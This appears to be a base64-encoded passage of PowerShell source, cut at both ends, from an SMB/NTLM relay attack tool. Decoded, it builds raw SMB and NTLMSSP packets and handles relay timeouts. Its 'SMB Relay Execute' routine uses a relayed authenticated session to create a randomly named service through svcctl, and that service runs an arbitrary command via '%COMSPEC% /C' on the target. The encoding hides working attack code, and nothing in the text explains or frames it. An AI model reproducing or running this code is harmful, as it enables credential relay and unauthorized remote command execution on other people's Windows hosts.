gICAgICAgICArICRTTUJfdXNlcl9JRGAKICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDBjLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmLDB4MDIsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICArICRTTUJfYmxvYl9sZW5ndGhgCiAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4NDQsMHgwMCwweDAwLDB4ODApYAogICAgICAgICAgICAgICAgKyAkU01CX2J5dGVfY291bnRgCiAgICAgICAgICAgICAgICArICgweGExLDB4ODIpYAogICAgICAgICAgICAgICAgKyAkU01CX2xlbmd0aF8xYAogICAgICAgICAgICAgICAgKyAoMHgzMCwweDgyKWAKICAgICAgICAgICAgICAgICsgJFNNQl9sZW5ndGhfMmAKICAgICAgICAgICAgICAgICsgKDB4YTIsMHg4MilgCiAgICAgICAgICAgICAgICArICRTTUJfbGVuZ3RoXzNgCiAgICAgICAgICAgICAgICArICgweDA0LDB4ODIpYAogICAgICAgICAgICAgICAgKyAkU01CX05UTE1TU1BfbGVuZ3RoYAogICAgICAgICAgICAgICAgKyAkSFRUUF9yZXF1ZXN0X2J5dGVzYAogICAgICAgICAgICAgICAgKyAoMHg1NSwweDZlLDB4NjksMHg3OCwweDAwLDB4NTMsMHg2MSwweDZkLDB4NjIsMHg2MSwweDAwKQoKICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0ud3JpdGUoJFNNQl9yZWxheV9yZXNwb25zZV9zZW5kLCAwLCAkU01CX3JlbGF5X3Jlc3BvbnNlX3NlbmQubGVuZ3RoKQogICAgICAgIAkkU01CX3JlbGF5X3Jlc3BvbnNlX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV90aW1lb3V0ID0gbmV3LXRpbWVzcGFuIC1TZWNvbmRzICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3N0b3B3YXRjaCA9IFtkaWFnbm9zdGljcy5zdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZigkU01CX3JlbGF5X3Jlc3BvbnNlX3N0b3B3YXRjaC5lbGFwc2VkIC1nZSAkU01CX3JlbGF5X3Jlc3BvbnNlX3RpbWVvdXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU01CIHJlbGF5IHRhcmdldCBkaWRuJ3QgcmVzcG9uZCB3aXRoaW4gJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQgc2Vjb25kcyIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhayA6U01CX3JlbGF5X3Jlc3BvbnNlX2xvb3AKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2Vfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9yZXNwb25zZV9ieXRlcywgMCwgJFNNQl9yZWxheV9yZXNwb25zZV9ieXRlcy5sZW5ndGgpCiAgICAgICAgICAgIAogICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAyCiAgICAgICAgICAgIAogICAgICAgICAgICAkaisrCiAgICAgICAgCiAgICAgICAgfQogICAgICAgIHJldHVybiAkU01CX3JlbGF5X3Jlc3BvbnNlX2J5dGVzCiAgICB9Cn0KCiMgU01CIFJlbGF5IEV4ZWN1dGUgU2NyaXB0QmxvY2sgLSBleGVjdXRlcyBjb21tYW5kIHdpdGhpbiBhdXRoZW50aWNhdGVkIFNNQiBzZXNzaW9uCiRTTUJfcmVsYXlfZXhlY3V0ZV9zY3JpcHRibG9jayA9CnsKICAgIEZ1bmN0aW9uIFNNQlJlbGF5RXhlY3V0ZQogICAgewogICAgICAgIHBhcmFtICgkU01CX3JlbGF5X3NvY2tldCwkU01CX3VzZXJfSUQpCiAgICAKICAgICAgICBpZiAoJFNNQl9yZWxheV9zb2NrZXQpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtID0gJFNNQl9yZWxheV9zb2NrZXQuR2V0U3RyZWFtKCkKICAgICAgICB9CgogICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJGZhbHNlCiAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQKICAgICAgICAkU01CX3NlcnZpY2VfcmFuZG9tID0gW1N0cmluZ106OkpvaW4oIjAwLSIsICgxLi4yMCB8IEZvckVhY2gtT2JqZWN0eyJ7MDpYMn0tIiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSA2NSAtTWF4aW11bSA5MCl9KSkKICAgICAgICAkU01CX3NlcnZpY2UgPSAkU01CX3NlcnZpY2VfcmFuZG9tIC1yZXBsYWNlICItMDAiLCIiCiAgICAgICAgJFNNQl9zZXJ2aWNlID0gJFNNQl9zZXJ2aWNlLlN1YnN0cmluZygwLCRTTUJfc2VydmljZS5MZW5ndGgtMSkKICAgICAgICAkU01CX3NlcnZpY2UgPSAkU01CX3NlcnZpY2UuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfc2VydmljZSA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJFNNQl9zZXJ2aWNlLDAsJFNNQl9zZXJ2aWNlLkxlbmd0aCkKICAgICAgICAkU01CX3NlcnZpY2VfcmFuZG9tICs9ICcwMC0wMC0wMCcKICAgICAgICBbQnl0ZVtdXSRTTUJfc2VydmljZV9ieXRlcyA9ICRTTUJfc2VydmljZV9yYW5kb20uU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMgPSBbU3RyaW5nXSgxLi40IHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pCiAgICAgICAgJFNNQl9yZWZlcmVudF9JRF9ieXRlcyA9ICRTTUJfcmVmZXJlbnRfSURfYnl0ZXMuU3BsaXQoIiAiKSB8IEZvckVhY2gtT2JqZWN0eyBbQ0hBUl1bQ09OVkVSVF06OnRvaW50MTYoJF8sMTYpfQogICAgICAgICRTTUJSZWxheUNvbW1hbmQgPSAiJUNPTVNQRUMlIC9DIGAiIiArICRTTUJSZWxheUNvbW1hbmQgKyAiYCIiCiAgICAgICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkU01CUmVsYXlDb21tYW5kKSB8IEZvckVhY2gtT2JqZWN0eyAkU01CX3JlbGF5X2NvbW1hbmQgKz0gInswOlgyfS0wMC0iIC1mICRfIH0KCiAgICAgICAgaWYoW2Jvb2xdKCRTTUJSZWxheUNvbW1hbmQubGVuZ3RoJTIpKQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kICs9ICcwMC0wMCcKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kICs9ICcwMC0wMC0wMC0wMCcKICAgICAgICB9ICAgIAogICAgICAgIAogICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzID0gJFNNQl9yZWxheV9jb21tYW5kLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHsgW0NIQVJdW0NPTlZFUlRdOjp0b2ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzLmxlbmd0aCArICRTTUJfc2VydmljZV9ieXRlcy5sZW5ndGggKyAyMzcpCiAgICAgICAgJFNNQl9zZXJ2aWNlX2RhdGFfbGVuZ3RoX2J5dGVzID0gJFNNQl9zZXJ2aWNlX2RhdGFfbGVuZ3RoX2J5dGVzWzIuLjBdCiAgICAgICAgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzLmxlbmd0aCArICRTTUJfc2VydmljZV9ieXRlcy5sZW5ndGggKyAyMzcgLSA2MykKICAgICAgICAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlcyA9ICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzWzAuLjFdICAgCiAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kX2xlbmd0aF9ieXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3JlbGF5X2NvbW1hbmRfYnl0ZXMubGVuZ3RoIC8gMikKCiAgICAgICAgJGsgPSAwCgogICAgICAgIDpTTUJfcmVsYXlfZXhlY3V0ZV9sb29wIHdoaWxlICgkayAtbHQgMTIpCiAgICAgICAgewogICAgICAgICAgICBzd2l0Y2ggKCRrKQogICAgICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMCB7CiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICgweDAwLDB4MDAsMHgwMCwweDQ1LDB4ZmYsMHg1MywweDRkLDB4NDIsMHg3NSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTgsMHgwMSwweDQ4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfdXNlcl9JRGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDQsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MWEsMHgwMCwweDAwLDB4NWMsMHg1YywweDMxLDB4MzAsMHgyZSwweDMxKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgzMCwweDJlLDB4MzIsMHgyZSwweDMxLDB4MzAsMHgzMiwweDVjLDB4NDksMHg1MCwweDQzLDB4MjQsMHgwMCwweDNmLDB4M2YsMHgzZiwweDNmLDB4M2YsMHgwMCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAxIHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gKDB4MDAsMHgwMCwweDAwLDB4NWIsMHhmZiwweDUzLDB4NGQsMHg0MiwweGEyLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDAyLDB4MjgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAzLDB4MDAsMHgxOCwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwNywweDAwLDB4MTYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwNywweDAwLDB4MDAsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOCwweDAwLDB4NWMsMHg3MywweDc2LDB4NjMsMHg2MywweDc0LDB4NmMsMHgwMCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMiB7CiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICgweDAwLDB4MDAsMHgwMCwweDg3LDB4ZmYsMHg1MywweDRkLDB4NDIsMHgyZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTgsMHgwNSwweDI4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfdXNlcl9JRGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwNCwweDAwLDB4MGUsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDAsMHhlYSwweDAzLDB4MDAsMHgwMCwweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMCwweDQ4LDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHg0OCwweDAwLDB4M2YsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDgsMHgwMCwweDA1LDB4MDAsMHgwYiwweDAzLDB4MTAsMHgwMCwweDAwLDB4MDAsMHg0OClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhkMCwweDE2LDB4ZDAsMHgxNiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMSwweDAwLDB4ODEsMHhiYiwweDdhLDB4MzYsMHg0NCwweDk4LDB4ZjEsMHgzNSwweGFkLDB4MzIsMHg5OCwweGYwLDB4MzgsMHgwMCwweDEwLDB4MDMsMHgwMiwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDQsMHg1ZCwweDg4LDB4OGEsMHhlYiwweDFjLDB4YzksMHgxMSwweDlmLDB4ZTgsMHgwOCwweDAwLDB4MmIsMHgxMCwweDQ4LDB4NjAsMHgwMiwweDAwLDB4MDAsMHgwMCkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbXVsdGlwbGV4X2lkID0gKDB4MDUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMyB7IAogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgNCB7CiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0gJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAoMHgwMCwweDAwLDB4MDAsMHg5YiwweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDUsMHgyOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwOClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3VzZXJfSURgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDYsMHgwMCwweDBlLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4ZWEsMHgwMywweDAwLDB4MDAsMHhmZiwweGZmLDB4ZmYsMHhmZiwweDA4LDB4MDAsMHg1MClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4NWMsMHgwMCwweDNmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDVjLDB4MDAsMHgwNSwweDAwLDB4MDAsMHgwMywweDEwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHg1YywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MzgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MGYsMHgwMCwweDAwLDB4MDAsMHgwMylgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTUsMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfc2VydmljZV9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgzZiwweDAwLDB4MGYsMHgwMCkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbXVsdGlwbGV4X2lkID0gKDB4MDcpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDUgeyAgCiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA2IHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gW0FSUkFZXSgweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3NlcnZpY2VfZGF0YV9sZW5ndGhfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4ZmYsMHg1MywweDRkLDB4NDIsMHgyZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTgsMHgwNSwweDI4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA4KWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkaW52ZWlnaC5wcm9jZXNzX0lEX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfdXNlcl9JRGAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwOCwweDAwLDB4MGUsMHhmZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9zZXJ2aWNlX2J5dGVfY291bnRfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4M2YsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3NlcnZpY2VfYnl0ZV9jb3VudF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwNSwweDAwLDB4MDAsMHgwMywweDEwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfc2VydmljZV9ieXRlX2NvdW50X2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDBjLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfY29udGV4dF9oYW5kbGVyYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDE1LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxNSwweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9zZXJ2aWNlX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfcmVmZXJlbnRfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MTUsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE1LDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3NlcnZpY2VfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweGZmLDB4MDEsMHgwZiwweDAwLDB4MTAsMHgwMSwweDAwLDB4MDAsMHgwMywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3JlbGF5X2NvbW1hbmRfbGVuZ3RoX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3JlbGF5X2NvbW1hbmRfbGVuZ3RoX2J5dGVzYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfcmVsYXlfY29tbWFuZF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9tdWx0aXBsZXhfaWQgPSAoMHgwOSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICA3IHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICA4IHsKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gKDB4MDAsMHgwMCwweDAwLDB4NzMsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDA1LDB4MjgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDBhLDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwOCwweDAwLDB4MzQpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDM0LDB4MDAsMHgzZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgzNCwweDAwLDB4MDUsMHgwMCwweDAwLDB4MDMsMHgxMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MzQsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDFjLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDEzLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfY29udGV4dF9oYW5kbGVyYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDkgewogICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAkU01CX3JlbGF5X2V4ZWN1dGVfUmVhZEFuZFJlcXVlc3QKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgMTAgeyAKICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gKDB4MDAsMHgwMCwweDAwLDB4NmIsMHhmZiwweDUzLDB4NGQsMHg0MiwweDJmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxOCwweDA1LDB4MjgpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDgpYAogICAgICAgICAgICAgICAgICAgICAgICArICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl91c2VyX0lEYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDBiLDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDBiLDB4MDEsMHgwMCwweDAwLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwOCwweDAwLDB4MmMpYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MDAsMHgwMCwweDJjLDB4MDAsMHgzZiwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgyYywweDAwLDB4MDUsMHgwMCwweDAwLDB4MDMsMHgxMCwweDAwLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICgweDAwLDB4MmMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDApYAogICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfY29udGV4dF9oYW5kbGVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAxMSB7CiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICA